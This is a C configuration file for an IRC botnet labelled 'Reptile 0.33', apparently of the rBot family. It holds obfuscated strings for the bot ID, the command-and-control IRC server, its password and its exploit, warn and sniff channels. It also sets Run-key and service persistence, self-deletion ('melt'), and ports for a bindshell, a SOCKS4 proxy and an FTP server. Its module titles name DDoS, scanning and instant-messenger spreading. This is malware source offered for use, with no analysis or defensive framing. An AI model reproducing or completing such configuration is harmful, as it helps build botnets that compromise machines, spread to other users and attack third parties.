
char mutexhandle[]		= "\x54\x49\x94\x4A\x08\x96\xB6\x25\xF8";		//*mutex handle

#ifndef _DEBUG
char botid[]			= "\x54\x49\x94\x4A\x08\x96\xB6\x25\xF8";		//*bot id
#else
char botid[]			= "\x54\x49\x94\x4A\x08\x96\xB6\x25\xF8";		//*bot id (debug)
#endif

unsigned short ftpdport	= 8082;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 5892;					// socks4 port
unsigned short redirport= 999;					// redirect local port
unsigned short bindport = 4460;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\rlog.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT
//--------------------------------------------------------------------------------------------------------

	char filename[]			= "\x53\x45\x94\x17\x49\x86\xBB\x3D\xB3\x69\x06\xCF";
	/* name.exe */

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x50\x41\xCD\xF8\x26\xEA\x7B\x50\xC9\x46\x65\xDC\xAD\xD1\x8A\x72\x89\xC2\xAC\xEB";
	/* http://yoururl.com/here */
#endif

	char version[]			= "\x7F\x0C\xA8\x41\x0B\x96\xBE\x3D\xF8\x2C\x53\x8A\x1E\x2A\x9C\xFB\x9F\xB2";
	/* [ Reptile - 0.33 ] */

#ifndef NO_SERVICE
	char servicename[]		= "\x53\x45\x94\x47\x14\x8C\xB1\x38\xFA\x22\x1B\xD2\x4B";
	/*  service name */
	char servicedisplayname[]= "\x53\x45\x94\x47\x14\x8C\xB1\x38\xFA\x22\x1B\xD2\x4B";
	/* service display name */
	char servicedesc[]		= "\x53\x45\x94\x47\x14\x8C\xB1\x38\xFA\x22\x1B\xD2\x4B";
	/* service description */
#else
	REGENT runkey = { 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run */
		"\x53\x45\x94\x40\x14\x95\xA4\x71\xFE\x63\x10\xCC\x47\x63"
		/* autostart description */
	};

#endif

	char password[]			= "\x4F\x4D\x94\x4F\x1E\x90";
	/* password */
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x16\x8B\xB4\x23\xF2\x7F\x11\xCC\x5A\x2A\xCC\xA7\xD2";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x16\x8B\xB4\x23\xF2\x7F\x11\xCC\x5A\x2A\xCC\xA7\xD2";//*!*@*
	char authhost2[] = "\x0E\x0D\xD0\x64\x16\x8B\xB4\x23\xF2\x7F\x11\xCC\x5A\x2A\xCC\xA7\xD2";//*!*@*
	char authhost3[] = "\x0E\x0D\xD0\x64\x16\x8B\xB4\x23\xF2\x7F\x11\xCC\x5A\x2A\xCC\xA7\xD2";//*!*@*
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x49\x43\x88\x54\x13";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{   
#ifndef _DEBUG // Live Config
			"\x56\x43\x95\x50\x55\x9B\xB1\x32\xF9\x6D\x08\xCB\x41\x2A\xC0\xBA\xD8",
			/* (server) */
			"\x50\x49\x88\x56\x14\x90",
			/* (server password) */
			3132,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (main channel) */
			"\x4C\x18\x82",
			/* (channel keyword) */
			"\x09\x45\xD1\x66",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (exploit channel) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (warn channel) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE"
			/* (sniff channel) */
		},
#else // Debug Config
			"\x56\x43\x95\x50\x55\x9B\xB1\x32\xF9\x6D\x08\xCB\x41\x2A\xC0\xBA\xD8",
			/* (server) */
			"\x50\x49\x88\x56\x14\x90",
			/* (server password) */
			3132,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (main channel) */
			"\x4C\x18\x82",
			/* (channel keyword) */
			"\x09\x45\xD1\x66",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (exploit channel) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE",
			/* (warn channel) */
			"\x07\x0F\xBD\x61\x38\xA9\x98\x72\xBE"
			/* (sniff channel) */
		},
#endif
	};

#ifndef NO_MELT
	REGENT meltkey=	{ 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions */
		"\x69\x49\x96\x50" 
		/* Melt */
	};
#endif

//--------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "\2MAIN :: \2";
char irc_title[]		= "\2IRC :: \2";
char process_title[]	= "\2PROC :: \2";
char sec_title[]		= "\2SECURE :: \2";
char unsec_title[]		= "\2UNSECURE :: \2";
char scan_title[]		= "\2SCAN :: \2";
char ftp_title[]		= "\2FTP :: \2";
char file_title[]		= "\2FILE :: \2";
char download_title[]	= "\2DOWNLOAD :: \2";
char update_title[]		= "\2UPDATE :: \2";
char logic_title[]		= "\2LOGIC :: \2";
char reg_title[]		= "\2REG :: \2";
char tcp_title[]		= "\2TCP :: \2";
char udp_title[]		= "\2UDP :: \2";
char sock4_title[]		= "\2SOCKS4 :: \2";
char ddos_title[]		= "\2DDOS :: \2";
char warn_title[]		= "\2WARN :: \2";
char threads_title[]	= "\2THREADS :: \2";
char aimspread_title[]	= "\2IM :: \2";